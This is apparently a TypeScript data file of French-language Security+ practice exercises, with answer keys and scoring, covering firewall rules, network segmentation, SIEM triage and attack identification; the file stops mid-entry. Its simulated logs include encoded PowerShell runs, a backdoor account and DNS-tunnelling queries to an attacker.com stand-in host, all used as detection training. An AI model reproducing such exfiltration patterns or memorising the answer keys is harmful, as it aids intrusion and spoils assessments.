import type { FirewallPBQ, InvestigationPBQ, PBQExercise, RackVLANPBQ, ScenarioTasksPBQ, SIEMPBQ, TimedConfigPBQ, TopologyPBQ, TerminalPBQ } from './pbq';
import { importedPbqExercises } from './imported-pbq-exercises';

export const pbqExercises: PBQExercise[] = [
  {
    "id": "pbq-firewall-001",
    "domain": "Security Architecture",
    "type": "firewall_rules",
    "title": "Configuration Firewall",
    "difficulty": "intermediate",
    "timeLimitSeconds": 300,
    "role": "Security Administrator",
    "scenario": "Configure le firewall.",
    "objective": "Creer les regles firewall.",
    "requirements": [
      "HTTPS pour utilisateurs internes",
      "Serveur web en DMZ",
      "DB jamais accessible Internet",
      "Seul DMZ interroge DB SQL",
      "SSH seulement subnet IT",
      "Telnet bloque partout",
      "Default deny"
    ],
    "assets": [
      {
        "name": "Internal Users",
        "ip": "10.10.0.0/16"
      },
      {
        "name": "IT Admin Subnet",
        "ip": "10.10.50.0/24"
      },
      {
        "name": "DMZ Web Server",
        "ip": "172.16.10.10"
      },
      {
        "name": "Database Server",
        "ip": "10.20.10.20"
      },
      {
        "name": "Internet",
        "ip": "ANY"
      }
    ],
    "ports": [
      {
        "port": 22,
        "protocol": "TCP",
        "service": "SSH"
      },
      {
        "port": 23,
        "protocol": "TCP",
        "service": "Telnet"
      },
      {
        "port": 80,
        "protocol": "TCP",
        "service": "HTTP"
      },
      {
        "port": 443,
        "protocol": "TCP",
        "service": "HTTPS"
      },
      {
        "port": 3306,
        "protocol": "TCP",
        "service": "MySQL"
      },
      {
        "port": 3389,
        "protocol": "TCP",
        "service": "RDP"
      },
      {
        "port": 53,
        "protocol": "UDP",
        "service": "DNS"
      }
    ],
    "expectedRules": [
      {
        "source": "ANY",
        "destination": "DMZ Web Server",
        "protocol": "TCP",
        "port": 443,
        "action": "Allow"
      },
      {
        "source": "DMZ Web Server",
        "destination": "Database Server",
        "protocol": "TCP",
        "port": 3306,
        "action": "Allow"
      },
      {
        "source": "IT Admin Subnet",
        "destination": "DMZ Web Server",
        "protocol": "TCP",
        "port": 22,
        "action": "Allow"
      },
      {
        "source": "ANY",
        "destination": "ANY",
        "protocol": "TCP",
        "port": 23,
        "action": "Deny"
      },
      {
        "source": "ANY",
        "destination": "ANY",
        "protocol": "ANY",
        "port": "ANY",
        "action": "Deny"
      }
    ],
    "scoring": {
      "max": 100,
      "rules": [
        {
          "condition": "https_to_dmz_allowed",
          "points": 20
        },
        {
          "condition": "db_not_exposed_internet",
          "points": 25
        },
        {
          "condition": "sql_only_web_to_db",
          "points": 20
        },
        {
          "condition": "ssh_only_it_subnet",
          "points": 15
        },
        {
          "condition": "telnet_blocked",
          "points": 10
        },
        {
          "condition": "default_deny",
          "points": 10
        }
      ],
      "penalties": [
        {
          "condition": "database_exposed_to_internet",
          "points": -40
        },
        {
          "condition": "allow_any_any",
          "points": -50
        },
        {
          "condition": "rdp_exposed_to_internet",
          "points": -30
        }
      ]
    },
    "pieges": [
      "ANY->DB:3306 erreur critique",
      "ALLOW ANY ANY = zero",
      "Oublier default deny",
      "Confondre HTTP/HTTPS",
      "Confondre SSH/Telnet"
    ]
  },
  {
    "id": "pbq-topology-001",
    "domain": "Security Architecture",
    "type": "topology",
    "title": "Topologie Reseau",
    "difficulty": "intermediate",
    "timeLimitSeconds": 240,
    "role": "Network Security Engineer",
    "scenario": "Place chaque systeme dans la bonne zone.",
    "objective": "Segmentation reseau DMZ/interne/restreint/invite.",
    "zones": [
      {
        "id": "dmz",
        "label": "DMZ",
        "description": "Zone exposee Internet"
      },
      {
        "id": "internal",
        "label": "Internal Network",
        "description": "Postes employes"
      },
      {
        "id": "restricted",
        "label": "Restricted Network",
        "description": "Serveurs critiques"
      },
      {
        "id": "guest",
        "label": "Guest Wi-Fi",
        "description": "Reseau invite isole"
      },
      {
        "id": "management",
        "label": "Management Network",
        "description": "Administration"
      },
      {
        "id": "backup",
        "label": "Backup Network",
        "description": "Sauvegarde isolee"
      }
    ],
    "items": [
      {
        "id": "web",
        "label": "Public Web Server",
        "correctZone": "dmz"
      },
      {
        "id": "mail",
        "label": "Mail Gateway",
        "correctZone": "dmz"
      },
      {
        "id": "dns",
        "label": "DNS Public Server",
        "correctZone": "dmz"
      },
      {
        "id": "db",
        "label": "Database Server",
        "correctZone": "restricted"
      },
      {
        "id": "dc",
        "label": "Domain Controller",
        "correctZone": "restricted"
      },
      {
        "id": "siem",
        "label": "SIEM",
        "correctZone": "restricted"
      },
      {
        "id": "workstations",
        "label": "Employee Workstations",
        "correctZone": "internal"
      },
      {
        "id": "guestwifi",
        "label": "Guest Wi-Fi",
        "correctZone": "guest"
      },
      {
        "id": "backup",
        "label": "Backup Server",
        "correctZone": "backup"
      },
      {
        "id": "jumpbox",
        "label": "Admin Jump Box",
        "correctZone": "management"
      }
    ],
    "constraints": [
      "Services publics en DMZ",
      "Identites critiques protegees",
      "Postes employes en interne",
      "Wi-Fi invite isole",
      "Backup protege ransomware"
    ],
    "scoring": {
      "max": 100,
      "rules": []
    }
  },
  {
    "id": "pbq-rack-vlan-001",
    "domain": "Security Architecture",
    "type": "rack_vlan",
    "title": "Racks & VLANs",
    "difficulty": "advanced",
    "timeLimitSeconds": 240,
    "role": "Datacenter Security Architect",
    "scenario": "Associe chaque equipement au bon rack et VLAN.",
    "objective": "Segmentation VLAN et placement physique.",
    "racks": [
      {
        "id": "rack_a",
        "label": "Rack A - DMZ",
        "description": "Serveurs exposes"
      },
      {
        "id": "rack_b",
        "label": "Rack B - Internal Servers",
        "description": "Serveurs internes"
      },
      {
        "id": "rack_c",
        "label": "Rack C - Management",
        "description": "Administration"
      },
      {
        "id": "rack_d",
        "label": "Rack D - Backup",
        "description": "Sauvegardes isolees"
      },
      {
        "id": "rack_e",
        "label": "Rack E - Network Equipment",
        "description": "Equipements reseau"
      }
    ],
    "vlans": [
      {
        "id": "vlan_10",
        "label": "VLAN 10 - Users"
      },
      {
        "id": "vlan_20",
        "label": "VLAN 20 - Servers"
      },
      {
        "id": "vlan_30",
        "label": "VLAN 30 - DMZ"
      },
      {
        "id": "vlan_40",
        "label": "VLAN 40 - Management"
      },
      {
        "id": "vlan_50",
        "label": "VLAN 50 - Guest"
      },
      {
        "id": "vlan_60",
        "label": "VLAN 60 - Backup"
      }
    ],
    "items": [
      {
        "id": "web",
        "label": "Web Server",
        "correctRack": "rack_a",
        "correctVlan": "vlan_30"
      },
      {
        "id": "db",
        "label": "Database Server",
        "correctRack": "rack_b",
        "correctVlan": "vlan_20"
      },
      {
        "id": "dc",
        "label": "Domain Controller",
        "correctRack": "rack_b",
        "correctVlan": "vlan_20"
      },
      {
        "id": "backup",
        "label": "Backup Server",
        "correctRack": "rack_d",
        "correctVlan": "vlan_60"
      },
      {
        "id": "firewall",
        "label": "Firewall",
        "correctRack": "rack_e",
        "correctVlan": "vlan_30"
      },
      {
        "id": "switch",
        "label": "Switch",
        "correctRack": "rack_e",
        "correctVlan": "vlan_20"
      },
      {
        "id": "jump",
        "label": "Jump Server",
        "correctRack": "rack_c",
        "correctVlan": "vlan_40"
      },
      {
        "id": "siem",
        "label": "SIEM",
        "correctRack": "rack_c",
        "correctVlan": "vlan_40"
      },
      {
        "id": "guest_controller",
        "label": "Guest Wi-Fi Controller",
        "correctRack": "rack_e",
        "correctVlan": "vlan_50"
      },
      {
        "id": "workstation",
        "label": "Employee Workstation",
        "correctRack": "rack_b",
        "correctVlan": "vlan_10"
      }
    ],
    "constraints": [
      "Serveurs publics en VLAN DMZ",
      "Admin en VLAN Management",
      "Sauvegardes isolees",
      "Wi-Fi invite != VLAN Users",
      "DB pas directement accessible Internet"
    ],
    "scoring": {
      "max": 100,
      "rules": []
    }
  },
  {
    "id": "pbq-siem-001",
    "domain": "Security Operations",
    "type": "siem",
    "title": "Analyse SIEM - Compromission",
    "difficulty": "advanced",
    "timeLimitSeconds": 300,
    "role": "SOC Analyst",
    "scenario": "Analyse les logs SIEM et reponds aux questions.",
    "objective": "Identifier compromission de compte avec escalade de privileges.",
    "logs": [
      {
        "time": "09:00",
        "source": "VPN-GW",
        "user": "jsmith",
        "event": "login_success",
        "destination": "Montreal"
      },
      {
        "time": "09:07",
        "source": "VPN-GW",
        "user": "jsmith",
        "event": "login_success",
        "destination": "Germany"
      },
      {
        "time": "09:09",
        "source": "DC01",
        "user": "jsmith",
        "event": "MFA_disabled",
        "destination": "-"
      },
      {
        "time": "09:10",
        "source": "DC01",
        "user": "jsmith",
        "event": "added_to_group=Domain Admins",
        "destination": "-"
      },
      {
        "time": "09:12",
        "source": "WS-104",
        "user": "SYSTEM",
        "event": "powershell.exe -EncodedCommand",
        "destination": "-"
      },
      {
        "time": "09:14",
        "source": "WS-104",
        "user": "SYSTEM",
        "event": "dns_query=ajd82ksla92.example",
        "destination": "185.22.10.8"
      }
    ],
    "questions": [
      {
        "id": "q1",
        "text": "Quel est le type d incident ?",
        "choices": [
          "Brute force",
          "Account compromise + privilege escalation",
          "DDoS",
          "Insider threat"
        ],
        "correctAnswer": 1,
        "explanation": "Impossible travel + MFA disabled + Domain Admins = compromission + escalade."
      },
      {
        "id": "q2",
        "text": "Quels sont les IOC/IOA ?",
        "choices": [
          "Login success normal",
          "Impossible travel + MFA disabled + encoded PS",
          "Packet loss eleve",
          "DNS normal"
        ],
        "correctAnswer": 1,
        "explanation": "Login depuis 2 pays en 7 min + MFA desactive + PS encode."
      },
      {
        "id": "q3",
        "text": "Quelle est la premiere action ?",
        "choices": [
          "Redemarrer le serveur",
          "Disable account / revoke sessions",
          "Attendre le lendemain",
          "Envoyer un email"
        ],
        "correctAnswer": 1,
        "explanation": "Contenir immediatement: desactiver le compte et revoquer les sessions."
      },
      {
        "id": "q4",
        "text": "Quelle severite ?",
        "choices": [
          "Low",
          "Medium",
          "High / Critical",
          "Info"
        ],
        "correctAnswer": 2,
        "explanation": "Domain Admins = controle total du domaine = Critique."
      },
      {
        "id": "q5",
        "text": "Quel controle long terme recommander ?",
        "choices": [
          "Rien",
          "MFA enforcement + conditional access + UEBA",
          "Plus de RAM",
          "Desactiver tous les comptes"
        ],
        "correctAnswer": 1,
        "explanation": "MFA obligatoire, conditional access, UEBA, alerting sur groupes sensibles."
      }
    ],
    "scoring": {
      "max": 100,
      "rules": []
    }
  },
  {
    "id": "pbq-ransomware-001",
    "domain": "Security Operations",
    "type": "investigation",
    "title": "Ransomware Investigation",
    "difficulty": "simulation",
    "timeLimitSeconds": 300,
    "role": "SOC Analyst",
    "scenario": "Plusieurs utilisateurs rapportent des fichiers .locked sur un partage. Le SIEM montre les evenements suivants.",
    "objective": "Identifier l attaque, choisir la premiere action et les IOCs.",
    "logs": [
      {
        "time": "10:01",
        "source": "WS-104",
        "event": "user=jsmith opened invoice.xlsm"
      },
      {
        "time": "10:03",
        "source": "WS-104",
        "event": "powershell.exe -EncodedCommand"
      },
      {
        "time": "10:04",
        "source": "WS-104",
        "event": "outbound connection 185.199.22.10:443"
      },
      {
        "time": "10:05",
        "source": "FILESRV01",
        "event": "mass file rename *.docx -> *.locked"
      },
      {
        "time": "10:06",
        "source": "FILESRV01",
        "event": "SMB write spike from WS-104"
      },
      {
        "time": "10:07",
        "source": "FILESRV01",
        "event": "Backup share access failed"
      }
    ],
    "tasks": [
      {
        "id": "t1",
        "label": "Identifier l attaque",
        "question": "Quel type d attaque ?",
        "choices": [
          "Ransomware",
          "DDoS",
          "SQL Injection",
          "DNS Poisoning"
        ],
        "correctAnswer": 0,
        "explanation": ".locked + mass rename = ransomware."
      },
      {
        "id": "t2",
        "label": "Action immediate",
        "question": "Quelle premiere action de containment ?",
        "choices": [
          "Isolate WS-104",
          "Reboot FILESRV01",
          "Delete all encrypted files",
          "Disable firewall"
        ],
        "correctAnswer": 0,
        "explanation": "Isoler la machine source."
      },
      {
        "id": "t3",
        "label": "Identifier 2 IOCs",
        "question": "Quels sont les IOCs ?",
        "choices": [
          "Normal HTTPS",
          ".locked + mass rename + SMB spike",
          "Login success",
          "DNS normal"
        ],
        "correctAnswer": 1,
        "explanation": ".locked, mass rename et SMB spike."
      },
      {
        "id": "t4",
        "label": "Mitigation long terme",
        "question": "Quelle mitigation ?",
        "choices": [
          "Offline immutable backups",
          "Disable all macros",
          "Remove all users",
          "Use Telnet"
        ],
        "correctAnswer": 0,
        "explanation": "Sauvegardes immuables hors ligne."
      },
      {
        "id": "t5",
        "label": "CIA le plus affecte",
        "question": "Quel pilier CIA ?",
        "choices": [
          "Confidentiality",
          "Availability",
          "Non-repudiation",
          "Authentication"
        ],
        "correctAnswer": 1,
        "explanation": "Fichiers chiffres = indisponibles."
      }
    ],
    "scoring": {
      "max": 100,
      "rules": []
    }
  },
  {
    "id": "pbq-timed-001",
    "domain": "Security Architecture",
    "type": "timed_config",
    "title": "Acces distant securise",
    "difficulty": "intermediate",
    "timeLimitSeconds": 240,
    "role": "Security Engineer",
    "scenario": "Configure une solution d acces distant securise.",
    "objective": "Choisir les bons composants pour un acces distant securise.",
    "prompt": "Configure a secure remote access solution.",
    "requirements": [
      "Remote admins need secure access to internal Linux servers.",
      "No direct SSH from Internet.",
      "MFA required.",
      "Logs must be centralized.",
      "Access must be limited to IT admins."
    ],
    "steps": [
      {
        "id": "c1",
        "condition": "VPN or ZTNA access first",
        "points": 20,
        "explanation": "Pas de SSH direct Internet."
      },
      {
        "id": "c2",
        "condition": "MFA enabled",
        "points": 20,
        "explanation": "MFA obligatoire."
      },
      {
        "id": "c3",
        "condition": "Jump server / bastion host",
        "points": 15,
        "explanation": "Bastion securise."
      },
      {
        "id": "c4",
        "condition": "SSH only from jump server",
        "points": 25,
        "explanation": "SSH uniquement depuis le bastion."
      },
      {
        "id": "c5",
        "condition": "Logs to SIEM",
        "points": 10,
        "explanation": "Logs centralises dans le SIEM."
      },
      {
        "id": "c6",
        "condition": "RBAC IT admins only",
        "points": 10,
        "explanation": "Acces limite aux admins IT via RBAC."
      }
    ],
    "scoring": {
      "max": 100,
      "rules": []
    }
  },
  {
    "id": "messer-attack-match-001",
    "domain": "Threats, Vulnerabilities, and Mitigations",
    "type": "topology",
    "title": "Messer: Associer Attaque a Description",
    "difficulty": "foundation",
    "timeLimitSeconds": 180,
    "role": "Security Analyst",
    "scenario": "Associe chaque description au type d attaque correct.",
    "objective": "Reconnaitre les attaques a partir de leur comportement observable.",
    "zones": [
      {
        "id": "onpath",
        "label": "On-path attack",
        "description": "Intercepte la communication entre 2 parties"
      },
      {
        "id": "keylogger",
        "label": "Keylogger",
        "description": "Enregistre les frappes clavier"
      },
      {
        "id": "vishing",
        "label": "Vishing",
        "description": "Hameconnage par appel vocal"
      },
      {
        "id": "ddos",
        "label": "DDoS",
        "description": "Submerge un service de requetes"
      },
      {
        "id": "injection",
        "label": "Injection",
        "description": "Insere du code dans une requete"
      },
      {
        "id": "supplychain",
        "label": "Supply chain",
        "description": "Compromet un fournisseur"
      },
      {
        "id": "rootkit",
        "label": "Rootkit",
        "description": "Malware cache dans l OS"
      },
      {
        "id": "rfid",
        "label": "RFID cloning",
        "description": "Copie les donnees d un badge"
      }
    ],
    "items": [
      {
        "id": "m1",
        "label": "A malicious actor intercepts communication between a user and a website",
        "correctZone": "onpath"
      },
      {
        "id": "m2",
        "label": "An attacker obtains credentials by recording keystrokes",
        "correctZone": "keylogger"
      },
      {
        "id": "m3",
        "label": "A caller tricks a victim into revealing banking information",
        "correctZone": "vishing"
      },
      {
        "id": "m4",
        "label": "Many systems overwhelm a public service",
        "correctZone": "ddos"
      },
      {
        "id": "m5",
        "label": "An attacker adds malicious input to access a database",
        "correctZone": "injection"
      },
      {
        "id": "m6",
        "label": "A malicious vendor update compromises an organization",
        "correctZone": "supplychain"
      },
      {
        "id": "m7",
        "label": "Hidden malware operates at the OS level undetected",
        "correctZone": "rootkit"
      },
      {
        "id": "m8",
        "label": "An attacker copies wireless card or badge data",
        "correctZone": "rfid"
      }
    ],
    "constraints": [
      "Lis chaque description attentivement.",
      "Un seul type d attaque par description."
    ],
    "scoring": {
      "max": 100,
      "rules": []
    }
  },
  {
    "id": "pbq-log-gen-bruteforce",
    "domain": "Security Operations",
    "type": "investigation",
    "title": "Log Gen: Brute Force",
    "difficulty": "intermediate",
    "timeLimitSeconds": 240,
    "role": "SOC Analyst",
    "scenario": "Le SIEM affiche les evenements suivants. Analyse et reponds.",
    "objective": "Identifier brute force + compromission admin.",
    "logs": [
      {
        "time": "10:01",
        "source": "VPN-GW",
        "event": "4625 failed login user=admin src=185.22.10.8"
      },
      {
        "time": "10:01",
        "source": "VPN-GW",
        "event": "4625 failed login user=admin src=185.22.10.8"
      },
      {
        "time": "10:01",
        "source": "VPN-GW",
        "event": "4625 failed login user=admin src=185.22.10.8"
      },
      {
        "time": "10:01",
        "source": "VPN-GW",
        "event": "4624 successful login user=admin src=185.22.10.8"
      },
      {
        "time": "10:01",
        "source": "DC01",
        "event": "4672 special privileges user=admin"
      },
      {
        "time": "10:01",
        "source": "DC01",
        "event": "4720 account created user=backdoor_svc"
      }
    ],
    "tasks": [
      {
        "id": "t1",
        "label": "Type",
        "question": "Type d attaque?",
        "choices": [
          "Brute force + admin compromise",
          "DDoS",
          "Insider threat",
          "Phishing"
        ],
        "correctAnswer": 0,
        "explanation": "4625 multiples puis 4624 meme IP + privileges + nouveau compte."
      },
      {
        "id": "t2",
        "label": "Severite",
        "question": "Severite?",
        "choices": [
          "Low",
          "Medium",
          "High",
          "Critical"
        ],
        "correctAnswer": 2,
        "explanation": "Compromission admin = High."
      },
      {
        "id": "t3",
        "label": "Action",
        "question": "Action immediate?",
        "choices": [
          "Disable account + block IP + revoke sessions",
          "Reboot DC",
          "Email",
          "Attendre"
        ],
        "correctAnswer": 0,
        "explanation": "Contenir: desactiver, bloquer IP, revoquer."
      },
      {
        "id": "t4",
        "label": "IOCs",
        "question": "IOCs?",
        "choices": [
          "4625 multiple + 4624 same IP + 4672 + 4720",
          "Login normal",
          "DNS standard",
          "Web traffic"
        ],
        "correctAnswer": 0,
        "explanation": "4625 multiples puis 4624 meme IP + privileges + compte cree."
      },
      {
        "id": "t5",
        "label": "Mitigation",
        "question": "Mitigation?",
        "choices": [
          "MFA + account lockout + PAW + alerting",
          "Rien",
          "Plus de RAM",
          "Telnet"
        ],
        "correctAnswer": 0,
        "explanation": "MFA, lockout, PAW, alerting groupes admin."
      }
    ],
    "scoring": {
      "max": 100,
      "rules": []
    }
  },
  {
    "id": "pbq-log-gen-dnstunnel",
    "domain": "Security Operations",
    "type": "investigation",
    "title": "Log Gen: DNS Tunneling",
    "difficulty": "advanced",
    "timeLimitSeconds": 240,
    "role": "SOC Analyst",
    "scenario": "Le monitoring DNS montre un trafic anormal. Analyse.",
    "objective": "Identifier exfiltration par tunnel DNS.",
    "logs": [
      {
        "time": "10:00",
        "source": "DNS-SRV",
        "event": "query=ajsd9283.company-data.attacker.com type=TXT"
      },
      {
        "time": "10:01",
        "source": "DNS-SRV",
        "event": "query=ksla7772.company-data.attacker.com type=TXT"
      },
      {
        "time": "10:02",
        "source": "DNS-SRV",
        "event": "query=zzx99182.company-data.attacker.com type=TXT"
      },
      {
        "time": "10:03",
        "source": "DNS-SRV",
        "event": "bytes_out_dns=950MB (baseline:5MB)"
      },
      {
        "time": "10:04",
        "source": "DNS-SRV",
        "event": "query=plm88219.company-data.attacker.com type=TXT"
      },
      {
        "time": "10:05",
        "source": "FW-EDGE",
        "event": "outbound DNS volume 200x baseline"
      }
    ],
    "tasks": [
      {
        "id": "t1",
        "label": "Type",
        "question": "Type d attaque?",
        "choices": [
          "DNS tunneling / exfiltration",
          "DDoS",
          "SQLi",
          "XSS"
        ],
        "correctAnswer": 0,
        "explanation": "TXT queries massives + volume DNS anormal."
      },
      {
        "id": "t2",
        "label": "Severite",
        "question": "Severite?",
        "choices": [
          "Low",
          "Medium",
          "High",
          "Critical"
        ],
        "correctAnswer": 2,
        "explanation": "Exfiltration = High."
      },
      {
        "id": "t3",
        "label": "IOCs",
        "question": "IOCs?",
        "choices": [
          "DNS TXT queries + volume anormal + domaine suspect",
          "HTTP normal",
          "Ping",
          "SSH"
        ],
        "correctAnswer": 0,
        "explanation": "TXT queries + volume 200x + domaine suspect."
      },
      {
        "id": "t4",
        "label": "Action",
        "question": "Action immediate?",
        "choices": [
          "Block domain + inspect DNS + isolate host",
          "Reboot DNS",
          "Attendre",
          "Ajouter RAM"
        ],
        "correctAnswer": 0,
        "explanation": "Bloquer domaine, inspecter DNS, isoler hote."
      },
      {
        "id": "t5",
        "label": "Mitigation",
        "question": "Mitigation?",
        "choices": [
          "DNS filtering + DLP + egress monitoring",
          "Rien",
          "Desactiver DNS",
          "Telnet"
        ],
        "correctAnswer": 0,
        "explanation": "Filtrage DNS, DLP, surveillance sortante."
      }
    ],
    "scoring": {
      "max": 100,
      "rules": []
    }
  },
  {
    "id": "pbq-sprint-001",
    "domain": "Security Architecture",
    "type": "timed_config",
    "title": "Sprint: Acces Distant (4 min)",
    "difficulty": "intermediate",
    "timeLimitSeconds": 240,
    "role": "Security Engineer",
    "scenario": "Configure un acces distant securise en 4 minutes.",
    "objective": "Identifier les composants essentiels sous pression.",
    "prompt": "Configure a secure remote access solution in 4 minutes.",
    "requirements": [
      "No direct SSH from Internet.",
      "MFA required.",
      "Logs centralized.",
      "IT admins only."
    ],
    "steps": [
      {
        "id": "s1",
        "condition": "VPN or ZTNA access first",
        "points": 25,
        "explanation": "Pas de SSH direct. VPN/ZTNA obligatoire."
      },
      {
        "id": "s2",
        "condition": "MFA enabled",
        "points": 20,
        "explanation": "MFA obligatoire."
      },
      {
        "id": "s3",
        "condition": "Jump server / bastion host",
        "points": 20,
        "explanation": "Bastion vers serveurs internes."
      },
      {
        "id": "s4",
        "condition": "SSH only from jump server",
        "points": 15,
        "explanation": "SSH uniquement depuis le bastion."
      },
      {
        "id": "s5",
        "condition": "Logs to SIEM",
        "points": 10,
        "explanation": "Logs centralises SIEM."
      },
      {
        "id": "s6",
        "condition": "RBAC IT admins only",
        "points": 10,
        "explanation": "Acces RBAC admins IT."
      }
    ],
    "scoring": {
      "max": 100,
      "rules": []
    }
  },
  {
    "id": "pbq-cloud-shared",
    "domain": "Security Architecture",
    "type": "investigation",
    "title": "Niveau 4: Cloud Shared Responsibility",
    "difficulty": "simulation",
    "timeLimitSeconds": 300,
    "role": "Cloud Security Architect",
    "scenario": "Migration cloud hybride. Determine les responsabilites.",
    "objective": "Maitriser le modele de responsabilite partagee.",
    "logs": [
      {
        "time": "Phase 1",
        "source": "Architecture",
        "event": "App web migree vers IaaS (VM Linux)"
      },
      {
        "time": "Phase 2",
        "source": "Architecture",
        "event": "DB migree vers PaaS (DBaaS)"
      },
      {
        "time": "Phase 3",
        "source": "Architecture",
        "event": "Messagerie migree vers SaaS (O365)"
      },
      {
        "time": "Phase 4",
        "source": "Architecture",
        "event": "Stockage objets migre vers IaaS (S3)"
      }
    ],
    "tasks": [
      {
        "id": "c1",
        "label": "IaaS-OS",
        "question": "Qui securise l OS de la VM IaaS?",
        "choices": [
          "Le client (vous)",
          "Le fournisseur",
          "Personne",
          "Les deux"
        ],
        "correctAnswer": 0,
        "explanation": "IaaS: client gere OS, apps, donnees."
      },
      {
        "id": "c2",
        "label": "PaaS-DB",
        "question": "Qui patche la DB PaaS?",
        "choices": [
          "Le client",
          "Le fournisseur",
          "Personne",
          "Un tiers"
        ],
        "correctAnswer": 1,
        "explanation": "PaaS: fournisseur gere plateforme et patching."
      },
      {
        "id": "c3",
        "label": "SaaS-MFA",
        "question": "Qui configure MFA sur O365?",
        "choices": [
          "Le client",
          "Microsoft",
          "Personne",
          "Les deux"
        ],
        "correctAnswer": 0,
        "explanation": "SaaS: client gere acces et MFA."
      },
      {
        "id": "c4",
        "label": "Stockage",
        "question": "Qui gere le chiffrement des donnees?",
        "choices": [
          "Le client",
          "Le fournisseur",
          "Personne",
          "Automatique"
        ],
        "correctAnswer": 0,
        "explanation": "Client responsable du chiffrement."
      },
      {
        "id": "c5",
        "label": "Controle",
        "question": "Quel modele donne le plus de controle?",
        "choices": [
          "IaaS",
          "PaaS",
          "SaaS",
          "Serverless"
        ],
        "correctAnswer": 0,
        "explanation": "IaaS = max controle + max responsabilite."
      }
    ],
    "scoring": {
      "max": 100,
      "rules": []
    }
  },

  // ─── Messer PBQ Models ───────────────────────────────────────────────────

  // 1. Attack matching (Messer A)
  {
    id: "pbq-messer-attack-001",
    domain: "2.4 Indicateurs d'activité malveillante",
    type: "scenario_tasks",
    title: "Identifier les types d'attaques",
    difficulty: "foundation",
    timeLimitSeconds: 360,
    role: "Security Analyst",
    scenario: "Vous analysez des rapports d'incident. Pour chaque description de comportement malveillant, identifiez le type d'attaque correspondant.",
    objective: "Reconnaître une attaque à partir d'un comportement observable, pas seulement à partir de son nom.",
    source: "Messer A",
    skills: ["Indicateurs d'activité malveillante", "Domaine 2.4 SY0-701"],
    scoring: {
      max: 80,
      rules: [{ condition: "Chaque association correcte", points: 10 }],
      penalties: [],
    },
    tasks: [
      {
        id: "t-attack-001",
        kind: "matching",
        title: "Description → Type d'attaque",
        prompt: "Associez chaque description d'action malveillante au type d'attaque correspondant. Chaque type est utilisé une seule fois.",
        items: [
          "A malicious actor intercepts communication between a user and a website",
          "An attacker obtains credentials by recording keystrokes",
          "A caller tricks a victim into revealing banking information over the phone",
          "Hundreds of compromised systems overwhelm a public web service with traffic",
          "Extra SQL code is inserted into a form field to access a database",
          "A malicious update from a trusted software vendor introduces malware",
          "Malware hides its presence from the operating system and security tools",
          "A wireless badge's data is copied to clone physical access credentials",
        ],
        options: [
          "On-path attack",
          "Keylogger",
          "Vishing",
          "DDoS",
          "Injection",
          "Supply chain attack",
          "Rootkit",
          "RFID cloning",
        ],
        expectedAnswers: [
          "On-path attack",
          "Keylogger",
          "Vishing",
          "DDoS",
          "Injection",
          "Supply chain attack",
          "Rootkit",
          "RFID cloning",
        ],
        explanation: `On-path (MITM) : intercepte le trafic en transit entre deux parties.
Keylogger : enregistre toutes les frappes pour capturer des identifiants.
Vishing : ingénierie sociale par appel vocal (voice + phishing).
DDoS : trafic massif provenant de multiples sources pour saturer un service.
Injection : insertion de code malveillant dans une entrée applicative (ex. SQL).
Supply chain : compromission via un fournisseur ou une mise à jour de confiance.
Rootkit : malware furtif qui se dissimule au niveau du système d'exploitation.
RFID cloning : copie des données d'un badge sans contact pour rejouer l'accès.`,
        traps: [
          "On-path vs Replay : on-path intercepte en temps réel ; replay réutilise une session déjà capturée.",
          "Vishing vs Phishing : vishing = appel téléphonique ; phishing = email ou message texte.",
          "Injection vs XSS : injection cible le back-end (DB) ; XSS injecte un script côté navigateur.",
          "Rootkit vs Keylogger : rootkit se cache dans l'OS ; keylogger capture uniquement les frappes.",
        ],
        points: 80,
      },
    ],
  } satisfies ScenarioTasksPBQ,

  // 2. Best security control by location (Messer A)
  {
    id: "pbq-messer-physical-002",
    domain: "2.7 Contrôles de sécurité physique",
    type: "scenario_tasks",
    title: "Meilleur contrôle physique par emplacement",
    difficulty: "foundation",
    timeLimitSeconds: 360,
    role: "Physical Security Consultant",
    scenario: "Vous définissez les standards de sécurité physique d'un siège social. Choisissez le meilleur contrôle pour chaque emplacement.",
    objective: "Sélectionner le contrôle de sécurité physique le plus adapté à chaque situation.",
    source: "Messer A",
    skills: ["Contrôles physiques", "Domaine 2.7 SY0-701"],
    scoring: {
      max: 80,
      rules: [{ condition: "Contrôle optimal", points: 10 }, { condition: "Contrôle acceptable", points: 5 }],
      penalties: [],
    },
    tasks: [
      {
        id: "t-physical-001",
        kind: "matching",
        title: "Emplacement → Meilleur contrôle de sécurité",
        prompt: "Associez chaque emplacement ou besoin au contrôle de sécurité physique le plus approprié. Chaque contrôle est utilisé une seule fois.",
        items: [
          "Visitor reception desk — verify identity of all visitors",
          "Parking lot at night — deter criminal activity",
          "Outer perimeter — establish physical boundary",
          "Data center entrance — prevent tailgating",
          "Employee entrance door — grant access to badge holders",
          "Server console — strong human biometric verification",
          "Remote admin login — something you have factor",
          "Monitoring hallway activity — detect and record movement",
        ],
        options: [
          "Security guard",
          "Lighting",
          "Fencing",
          "Access control vestibule",
          "Access badge",
          "Biometrics",
          "Authentication token",
          "Video surveillance",
        ],
        expectedAnswers: [
          "Security guard",
          "Lighting",
          "Fencing",
          "Access control vestibule",
          "Access badge",
          "Biometrics",
          "Authentication token",
          "Video surveillance",
        ],
        explanation: `Security guard : présence humaine pour vérifier l'identité et réagir aux incidents.
Lighting : dissuasion nocturne la plus efficace pour un parking.
Fencing : délimitation physique du périmètre extérieur.
Access control vestibule (sas) : empêche le tailgating car une seule personne entre à la fois.
Access badge : contrôle d'accès pour portes employés ; plus rapide qu'un garde.
Biometrics : vérification unique d'une caractéristique humaine (empreinte, iris).
Authentication token : facteur "quelque chose que vous avez" pour l'accès distant.
Video surveillance : enregistrement passif du mouvement dans les couloirs.`,
        traps: [
          "Badge seul ≠ anti-tailgating : deux personnes peuvent entrer avec un seul badge.",
          "Caméra = detective, pas preventive : elle enregistre mais ne bloque pas l'accès.",
          "Lighting = deterrent principalement, pas detective.",
          "Security guard = operational dans la taxonomie CompTIA (humain qui applique une règle).",
        ],
        points: 80,
      },
    ],
  } satisfies ScenarioTasksPBQ,

  // 3. Control category classification (Messer)
  {
    id: "pbq-messer-category-003",
    domain: "1.1 Catégories de contrôles de sécurité",
    type: "scenario_tasks",
    title: "Catégorie de contrôle : Technical / Managerial / Operational / Physical",
    difficulty: "foundation",
    timeLimitSeconds: 300,
    role: "Security Architect",
    scenario: "Pour chaque élément de sécurité, déterminez s'il appartient à la catégorie Technical, Managerial, Operational ou Physical.",
    objective: "Distinguer les quatre catégories de contrôles de sécurité selon la taxonomie SY0-701.",
    source: "Messer",
